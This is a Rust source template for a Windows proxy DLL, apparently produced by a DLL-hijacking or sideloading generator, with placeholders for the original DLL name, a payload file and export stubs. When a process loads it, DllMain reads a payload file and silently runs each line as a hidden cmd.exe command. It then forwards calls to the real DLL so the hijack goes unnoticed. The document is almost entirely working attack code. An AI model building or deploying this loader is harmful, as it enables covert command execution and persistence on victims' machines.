#![allow(non_snake_case, dead_code, unused_imports)]
use std::ffi::c_void;
use std::fs;
use std::os::windows::process::CommandExt;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::sync::OnceLock;

type BOOL = i32;
type DWORD = u32;
type HINSTANCE = *mut c_void;
type LPVOID = *mut c_void;
type HMODULE = *mut c_void;
type FARPROC = *const c_void;
type LPCWSTR = *const u16;

const DLL_PROCESS_ATTACH: DWORD = 1;
const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const ORIGINAL_DLL: &str = "__ORIGINAL_DLL__";
const PAYLOAD_NAME: &str = "__PAYLOAD_NAME__";
const PAYLOAD_FALLBACK: &str = "__PAYLOAD_FALLBACK__";

#[link(name = "kernel32")]
extern "system" {
    fn GetModuleFileNameW(h: HINSTANCE, buf: *mut u16, size: DWORD) -> DWORD;
    fn LoadLibraryW(name: LPCWSTR) -> HMODULE;
    fn GetProcAddress(h: HMODULE, name: *const u8) -> FARPROC;
}

static DLL_DIR: OnceLock<PathBuf> = OnceLock::new();
static ORIGINAL_HMODULE: OnceLock<usize> = OnceLock::new();

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn original_module() -> HMODULE {
    let h = *ORIGINAL_HMODULE.get_or_init(|| unsafe {
        let dir = DLL_DIR.get().cloned().unwrap_or_else(|| PathBuf::from("."));
        let w = to_wide(&dir.join(ORIGINAL_DLL).to_string_lossy());
        LoadLibraryW(w.as_ptr()) as usize
    });
    h as HMODULE
}

unsafe fn resolve(name: &[u8]) -> FARPROC {
    GetProcAddress(original_module(), name.as_ptr())
}

fn run_payload(dir: &PathBuf) {
    let local = dir.join(PAYLOAD_NAME);
    let path = if local.is_file() {
        local
    } else {
        PathBuf::from(PAYLOAD_FALLBACK)
    };
    let Ok(text) = fs::read_to_string(path) else { return; };
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() { continue; }
        let _ = Command::new("cmd.exe")
            .arg("/c")
            .raw_arg(line)
            .creation_flags(CREATE_NO_WINDOW)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }
}

#[no_mangle]
pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _r: LPVOID) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        unsafe {
            let mut buf = [0u16; 512];
            let n = GetModuleFileNameW(hinst, buf.as_mut_ptr(), 512);
            if n > 0 {
                let path = String::from_utf16_lossy(&buf[..n as usize]);
                if let Some(parent) = PathBuf::from(&path).parent() {
                    let _ = DLL_DIR.set(parent.to_path_buf());
                }
            }
        }
        if let Some(dir) = DLL_DIR.get() { run_payload(dir); }
    }
    1
}

__STUBS__
